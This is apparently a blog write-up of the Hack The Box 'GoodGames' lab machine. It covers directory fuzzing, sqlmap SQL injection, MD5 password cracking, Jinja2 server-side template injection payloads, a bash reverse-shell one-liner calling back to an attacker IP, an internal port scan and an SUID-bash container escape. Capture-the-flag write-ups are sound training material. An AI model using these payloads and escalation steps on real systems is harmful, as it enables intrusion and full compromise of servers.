<div class="banner">
    <div class="ads">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6"><path stroke-linecap="round" stroke-linejoin="round" d="M12 12.75c1.148 0 2.278.08 3.383.237 1.037.146 1.866.966 1.866 2.013 0 3.728-2.35 6.75-5.25 6.75S6.75 18.728 6.75 15c0-1.046.83-1.867 1.866-2.013A24.204 24.204 0 0 1 12 12.75Zm0 0c2.883 0 5.647.508 8.207 1.44a23.91 23.91 0 0 1-1.152 6.06M12 12.75c-2.883 0-5.647.508-8.208 1.44.125 2.104.52 4.136 1.153 6.06M12 12.75a2.25 2.25 0 0 0 2.248-2.354M12 12.75a2.25 2.25 0 0 1-2.248-2.354M12 8.25c.995 0 1.971-.08 2.922-.236.403-.066.74-.358.795-.762a3.778 3.778 0 0 0-.399-2.25M12 8.25c-.995 0-1.97-.08-2.922-.236-.402-.066-.74-.358-.795-.762a3.734 3.734 0 0 1 .4-2.253M12 8.25a2.25 2.25 0 0 0-2.248 2.146M12 8.25a2.25 2.25 0 0 1 2.248 2.146M8.683 5a6.032 6.032 0 0 1-1.155-1.002c.07-.63.27-1.222.574-1.747m.581 2.749A3.75 3.75 0 0 1 15.318 5m0 0c.427-.283.815-.62 1.155-.999a4.471 4.471 0 0 0-.575-1.752M4.921 6a24.048 24.048 0 0 0-.392 3.314c1.668.546 3.416.914 5.223 1.082M19.08 6c.205 1.08.337 2.187.392 3.314a23.882 23.882 0 0 1-5.223 1.082" /></svg>
        Offensive Security
    </div>
    <h1>
        <span>Vishok - Hacking Pentesting</span>
        GoodGames HTB Writeup
    </h1>
</div>

####
####
####
## Open ports in target machine
### Nmap
After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
####
<div class="tip">

###### Nmap scan
> Is time to perfom a scan using **nmap** to discover a treasure. 
</div>

####
```ruby
80/tcp open  http
```
####
####
####
## Services that are running in the target machine
### HTTP
If we access the website using the domain reported by **nmap**: http://goodgames.htb, we won't find anything; it's a video game store-type website, but we see no extra information such as a login or registration link. At this point, the obvious thing to do is enumeration to discover directories or files. Let's use **wfuzz**:
####
```js
wfuzz -c -u 'http://goodgames.htb/FUZZ' -w /usr/share/wordlists/dictionary/web-content/directory-list-lowercase-2.3-medium.txt -t 150 --hw 548,5548
```
####
- ##### Wfuzz Param
    - `-c` Colors the displayed results
    - `-u` Specifies the URL of the site to enumerate 
    - `-w` Specifies the path to the wordlist to use 
    - `-t` Specifies the number of parallel tasks to launch 
    - `--hw` Hides results with a specific word count 
####
The gobuster report us the nex information:
####
```perl
000000086:   200        266 L    545  W      9267 Ch      "profile"
000000053:   200        266 L    553  W      9294 Ch      "login"
000000032:   200        908 L    2572 W     44206 Ch      "blog"
000000215:   200        727 L    2070 W     33387 Ch      "signup"
000001158:   302        3   L    24   W       208 Ch      "logout"
```
####
We have a directory with a registration and login panel, so we proceed to register and authenticate. After trying things like *(XSS*, *SSTI*, *SQLI)*, the site doesn't respond to any, but if we use the email: admin@goodgames.htb, we see a message: *(The user already exists)*. 
####
This means the **email** field is probably vulnerable to a more sophisticated attack. So we will use **sqlmap** to perform a SLQi *(SQL Injection)* attack; the first step is to determine if it is really vulnerable.
####
### SQLI
To perform an injection, we need the **cookies** given when we log in, as well as other necessary fields. For this, we need to intercept the login request with **Burpsuite** to generate an **item** in *XML* format to pass to sqlmap: `sqlmap -r intercepted_request`. Once sqlmap finishes evaluating the request, it shows us this on the screen:
####
```perl
Parameter: email (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: email=admin@goodgames.htb' AND (SELECT 7256 FROM (SELECT(SLEEP(5)))HFQo) AND 'lZjy'='lZjy&password=12345

Type: UNION query
Title: Generic UNION query (NULL) - 4 columns
Payload: email=-7226' 
    UNION ALL SELECT NULL,CONCAT(
        0x7171707171,
        0x517650446e62534f666c7165446e63656c5854757861644c576b57627a41756376534c46704b7947,
        0x716a717071
    ),
    NULL,NULL-- -&password=12345
```
####
- ##### Sqlmap Param
    - `--tables` Enumerates tables
    - `--columns` Enumerates columns
    - `-r` XML file with the request
    - `-T` Specifies the table to dump
    - `--dbs` Database discovery
    - `--dump` Dumps tables or columns as specified
####
### SQLI discovery databases
Now that we know it can be exploited with injections: *(Time Based*, *Union Query)*, we can use the **dbs** parameter to dump the database contents.
####
```perl
sqlmap -r intercepted_request --dbs
```
####
### SQLI dump tables
With the previous command, **sqlmap** reports 2 databases on the machine; now we need to dump the tables in those databases.
####
```perl
sqlmap -r intercepted_request --tables --dump
```
####
### SQLI dump columns
With the previous command, sqlmap reports 82 tables on the machine; now we need to dump the columns in the **admin_users** table, which is probably where valid users are.
####
```perl
sqlmap -r req --T user --columns --dump
```
####
### Crack passwords
In this case, sqlmap conveniently dumped the contents of the **user** table columns for us, but if we hadn't used the **-C** parameter to specify the columns to dump. The passwords seem to be in *MD5* format, so we need to crack them. First, let's use an online tool called **Crackstation**: https://crackstation.net/. The password for the `admin` user is `superadministrator`.
####
####
####
## First exploitation phase
### Subdomain
When we log in as **admin**, at the top there's a nav with a **settings** icon; clicking it takes us to a new subdomain: http://internal-administration.goodgames.htb/. If we add it to `/etc/hosts` and access it, it takes us a *Flask Volt* login panel.

####
It appears to be an administration dashboard; we don't know the credentials, but we have those for **admin**, so if we try `admin:superadministrator`, we gain access as the admin user in the dashboard. Earlier we saw **Flask**, so Python might be running in the background.
####
If we start browsing, we see nothing; there are sections and buttons without actions. But there is a section to configure the personal information of the **admin** user. This form is functional, so if we fill in the information, some section should update.
####
If we see our input reflected in the form, it could be a clear indication that this section is vulnerable to SSTI *(Server Side Template Injection)*, and since Python with **Flask** is running in the background, it could be vulnerable to **Jinja**, for example. Let's test by entering `{{7*7}}` in the `full_name` field.
####
<div class="info">

###### Server-Side Template injection
> A **Server-Side Template injection** attack is when a threat actor exploits a template's native syntax and injects malicious payloads into the template. The compromised template is then executed server-side.
</div>

####
Indeed, the result of the operation is reflected in the **Profile Card**. We need to look for payloads that use double curly braces `{{` to try to generate a reverse shell and gain access to the victim machine.
####
### Jinja2
If we look for payloads to exploit *SSTI* on sites like: https://github.com/swisskyrepo/PayloadsAllTheThings, we'll find many payloads to read files and execute commands. The idea is to determine if we can execute system-level commands:
####
```perl
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
####
This payload shows us the root user's id in the **Profile Card**, so if we gain access, we would do so as the highest-privileged user. Let's check if the victim machine can communicate with us; we'll listen with **tcpdump** to intercept *ICMP* traffic and modify the payload so that instead of executing the `id` command, it does a ping:
####
```perl
Target machine ->
sudo tcpdump -i tun0 icmp
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ping -c 1 10.10.16.6').read() }}

Local machine ->
22:26:26.036789 IP goodgames.htb > 10.10.16.6: ICMP echo request, id 398, seq 1, length 64
22:26:26.036817 IP 10.10.16.6 > goodgames.htb: ICMP echo reply, id 398, seq 1, length 64
```
####
We receive the ICMP trace, so we'll try running different one-liners, since we don't know if the system has tools like **nc**, **bash**, or if it performs any sanitization.
####
```perl
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /de/tcp/10.10.16.6/1234 0>&1"').read() }}
```
####
####
####
## Second exploit phase (Privilage Escalation)
### Docker:
Unfortunately, if we run the `ifconfig` command, we'll realize we are inside a container, so we'll need to escape it and target the real machine. But not before retrieving the flag, which we have access to. We are in container `172.19.0.2`, but if we are two, who is 1? We'll perform internal port enumeration. It would be much easier to do it in Python, but for that, the machine must have it installed. If we run:
####
```bash
which python
```
####
The machine returns the **path** where it is located, so it is installed.
####
```python
#!/usr/bin/python3
import os
from time import sleep

def main():
    for port in range(0, 200):
        sleep(0.5)
        os.system(f'bash -c "</dev/tcp/172.19.0.1/{port} 0>&1" 2>/dev/null && echo "{port} open"')

if __name__ == '__main__':
    main()
```
####
- ##### Script param
    - `</dev/tcp` The less-than symbol before **/dev/tcp** indicates data will be sent, not connections; if it responds, the port is active.
####
We see in the terminal that the script reports port **22** open, we have the users `root` and `augustus`. We could try the password for the container's admin user, which is: `superadministrator`, so we gain access as the augustus user.
####
### Bash
Although the flag is not inside the container, we are **root** and have the highest privileges. Something we can do is copy binaries from `/bin` to a directory where we have permission. As the **augustus** user, we have permission in our `/home`, so we'll copy the **bash** binary.
####
```bash
cp /bin/bash /home/augustus/
```
####
Now we'll switch back to the **root** user in the container and change the permissions of that binary:
####
```bash
chown root:root bash
chmod 4755 bash
```
####
We're changing the **Owner** of the binary to root, not of the container, but of the victim machine, and assigning the *SUID* permission *4755* to that binary so it can be executed as root. We return to the **augustus** user and run the binary: `./bash -p`
####
<div class="info">

###### Bash parameter
> The `-p` parameter disables protections, causing it to run with maximum privileges thanks to the **SUID** permission.
</div>
